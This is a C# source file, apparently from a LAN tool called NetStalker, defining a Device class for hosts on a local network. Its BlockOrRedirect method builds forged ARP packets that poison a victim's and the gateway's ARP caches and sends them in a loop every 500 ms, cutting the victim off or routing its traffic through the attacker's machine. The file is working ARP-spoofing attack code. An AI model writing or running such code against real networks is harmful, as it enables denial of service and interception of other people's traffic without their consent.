using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.ExceptionServices;
using System.Security;
using System.Threading;
using PacketDotNet;
using SharpPcap;

namespace NetStalker
{
    public class Device
    {
        public DateTime TimeSinceLastArp = DateTime.Now;
        public IPAddress IP { get; set; }
        public PhysicalAddress MAC { get; set; }
        public string DeviceStatus { get; set; }
        public int DownloadCap { get; set; }
        public string DownloadSpeed { get; set; }
        public string UploadSpeed { get; set; }
        public int UploadCap { get; set; }
        public int PacketsSentSinceLastReset { get; set; }
        public int PacketsReceivedSinceLastReset { get; set; }
        public string DeviceName { get; set; }
        public string ManName { get; set; }

        public bool IsLocalDevice
        {
            get
            {
                if (IP.ToString() == Properties.Settings.Default.localip)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        public bool IsGateway
        {
            get
            {
                if (IP.ToString() == Properties.Settings.Default.Gateway)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }

        }

        public bool Blocked { get; set; }
        public bool Redirected { get; set; }
        public int TotalPacketsSent { get; set; }
        public int TotalPacketsReceived { get; set; }
        public IPAddress GatewayIP { get; set; }
        public PhysicalAddress GatewayMAC { get; set; }
        public bool BlockerActive { get; set; }
        public bool RedirectorActive { get; set; }
        public IPAddress LocalIP { get; set; }
        public bool LimiterStarted { get; set; }

        public bool SpoofProtection
        {
            get { return Properties.Settings.Default.SpoofProtection; }
        }

        [HandleProcessCorruptedStateExceptions]
        [SecurityCritical]
        public void BlockOrRedirect()
        {

            ICaptureDevice capturedevice = (from devicex in CaptureDeviceList.Instance where ((SharpPcap.WinPcap.WinPcapDevice)devicex).Interface.FriendlyName == NetStalker.Properties.Settings.Default.friendlyname select devicex).ToList()[0];
            capturedevice.Open();

            #region Spoof

            ARPPacket ArpPacketForVicSpoof = new ARPPacket(ARPOperation.Request, MAC, IP, capturedevice.MacAddress, GatewayIP);
            ARPPacket ArpPacketForGatewaySpoof = new ARPPacket(ARPOperation.Request, GatewayMAC, GatewayIP, capturedevice.MacAddress, IP);
            EthernetPacket EtherPacketForVicSpoof = new EthernetPacket(capturedevice.MacAddress, MAC, EthernetPacketType.Arp);
            EthernetPacket EtherPacketForGatewaySpoof = new EthernetPacket(capturedevice.MacAddress, GatewayMAC, EthernetPacketType.Arp);
            EtherPacketForGatewaySpoof.PayloadPacket = ArpPacketForGatewaySpoof;
            EtherPacketForVicSpoof.PayloadPacket = ArpPacketForVicSpoof;

            #endregion

            #region Protection

            ARPPacket ArpPacketForVicProtection = new ARPPacket(ARPOperation.Request, capturedevice.MacAddress, LocalIP, MAC, IP);
            ARPPacket ArpPacketForGatewayProtection = new ARPPacket(ARPOperation.Request, capturedevice.MacAddress, LocalIP, GatewayMAC, GatewayIP);
            EthernetPacket EtherPacketForVicProtection = new EthernetPacket(MAC, capturedevice.MacAddress, EthernetPacketType.Arp);
            EthernetPacket EtherPacketForGatewayProtection = new EthernetPacket(GatewayMAC, capturedevice.MacAddress, EthernetPacketType.Arp);
            EtherPacketForGatewayProtection.PayloadPacket = ArpPacketForGatewayProtection;
            EtherPacketForVicProtection.PayloadPacket = ArpPacketForVicProtection;

            #endregion



            new Thread(() =>
            {

                try
                {

                    while (Blocked)
                    {

                        capturedevice.SendPacket(EtherPacketForVicSpoof);
                        if (Redirected)
                        {
                            capturedevice.SendPacket(EtherPacketForGatewaySpoof);
                        }
                        if (SpoofProtection)
                        {
                            capturedevice.SendPacket(EtherPacketForGatewayProtection);
                            capturedevice.SendPacket(EtherPacketForVicProtection);
                        }
                        Thread.Sleep(500);

                    }

                }
                catch (PcapException)
                {
                }

            }).Start();
        }


    }
}
